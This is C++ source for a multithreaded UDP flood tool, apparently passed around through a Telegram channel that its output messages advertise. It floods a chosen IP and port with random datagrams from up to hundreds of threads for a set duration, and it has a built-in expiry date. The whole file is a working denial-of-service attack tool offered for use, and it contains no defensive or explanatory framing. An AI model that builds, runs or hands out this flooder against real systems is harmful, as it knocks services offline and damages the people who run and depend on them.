#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>
#include <sstream>
#include <iomanip>
#ifdef _WIN32
    #include <windows.h>
    void usleep(int duration) { Sleep(duration / 1000); }
#else
    #include <unistd.h>
#endif

// Preprocessor directives
#define PAYLOAD_SIZE 900              // Set payload size to 900
#define RANDOM_STRING_SIZE 999        // Random string size for the payload
#define DEFAULT_THREAD_COUNT 900      // Default thread count

#define EXPIRY_DATE "2026-03-06"      // Expiry date

class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {}

    void generate_payload(char *buffer, size_t size) {
        for (size_t i = 0; i < size; i++) {
            buffer[i * 4] = '\\';
            buffer[i * 4 + 1] = 'x';
            buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
            buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
        }
        buffer[size * 4] = '\0';
    }

    void generate_random_string(char *buffer, size_t size) {
        const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        for (size_t i = 0; i < size; i++) {
            buffer[i] = charset[rand() % (sizeof(charset) - 1)];
        }
        buffer[size] = '\0';
    }

    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime;

        // We generate a random string for the payload
        char random_string[RANDOM_STRING_SIZE + 1];
        generate_random_string(random_string, RANDOM_STRING_SIZE);

        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            pthread_exit(NULL);
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

        endtime = time(NULL) + duration;
        while (time(NULL) <= endtime) {
            if (sendto(sock, random_string, RANDOM_STRING_SIZE, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }

        close(sock);
    }

private:
    std::string ip;
    int port;
    int duration;
};

void handle_sigint(int sig) {
    std::cout << "\nStopping attack...\n";
    exit(0);
}

void usage() {
    std::cout << "Usage: ./lost << ip >> << port >> << duration >> << threads >>\n";
    exit(1);
}

bool is_file_expired() {
    struct tm tm;
    std::istringstream ss(EXPIRY_DATE);
    ss >> std::get_time(&tm, "%Y-%m-%d");
    if (ss.fail()) {
        std::cerr << "Error parsing expiry date. Please use the format YYYY-MM-DD\n";
        exit(1);
    }

    time_t expiry_time = mktime(&tm);
    time_t current_time = time(NULL);

    return current_time > expiry_time;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    if (is_file_expired()) {
        std::cout << "This file has expired. Program will terminate.\n";
        return 0;
    }

    std::string ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int threads = std::atoi(argv[4]);

    // If no thread count is provided, use the default defined value
    if (threads <= 0) {
        threads = DEFAULT_THREAD_COUNT;
    }

    std::signal(SIGINT, handle_sigint);

    std::vector<pthread_t> thread_ids(threads);
    std::vector<std::unique_ptr<Attack>> attacks;

    std::cout << "Attack started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads\n";
    std::cout << "Expiry date: " << EXPIRY_DATE << "\n";

    for (int i = 0; i < threads; i++) {
        attacks.push_back(std::make_unique<Attack>(ip, port, duration));

        if (pthread_create(&thread_ids[i], NULL, [](void* arg) -> void* {
            Attack* attack = static_cast<Attack*>(arg);
            attack->attack_thread();
            return nullptr;
        }, attacks[i].get()) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        std::cout << "RAJ ATTACK START: " << thread_ids[i] << "\n";
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    std::cout << "               ATTACK FINISHED                   \n";
    std::cout << "          OWNER -------  @RAJOWNER90               \n";
    std::cout << "                                                    \n";
    std::cout << "                 RAJOWNER                       \n";
    std::cout << "    JOIN - https://t.me/RAJOWNER9090         \n";
    return 0;
}

